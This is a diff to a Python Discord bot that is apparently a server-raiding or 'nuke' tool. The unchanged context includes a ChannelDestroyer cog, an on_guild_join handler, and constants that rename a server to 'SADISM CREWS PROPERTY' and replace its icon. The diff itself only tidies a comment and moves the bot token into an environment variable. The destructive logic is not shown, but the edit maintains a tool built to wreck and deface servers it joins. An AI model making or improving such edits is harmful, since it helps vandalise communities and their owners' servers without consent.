@@ -1,6 +1,7 @@
 import subprocess
 import sys
 import random
+import os  # for environment variables
 
 try:
     import discord
@@ -23,7 +24,7 @@ import asyncio
 import random
 
 # Your constants here
-NEW_SERVER_NAME = "SADISM CREWS PROPERTY" #replace with your rename
+NEW_SERVER_NAME = "SADISM CREWS PROPERTY"  #replace with your rename
 NEW_SERVER_ICON_URL = "https://imgur.com/a/AYjgAV8"  # Why the fuck do i speak in third person like this bro
 HARDCODED_USER_ID = 1361438095202980045
 
@@ -240,11 +241,14 @@ async def on_guild_join(guild):
     except Exception:
         pass
 
-# Startup code with token:
+# Startup code with token from environment variable:
 
 async def main():
     await bot.add_cog(ChannelDestroyer(bot))
-    token = ""  # <-- Replace this with your Discord bot token
+    token = os.getenv("DISCORD_TOKEN")
+    if not token:
+        print("[!] ERROR: No DISCORD_TOKEN environment variable found.")
+        return
     await bot.start(token)
 
 if __name__ == "__main__":
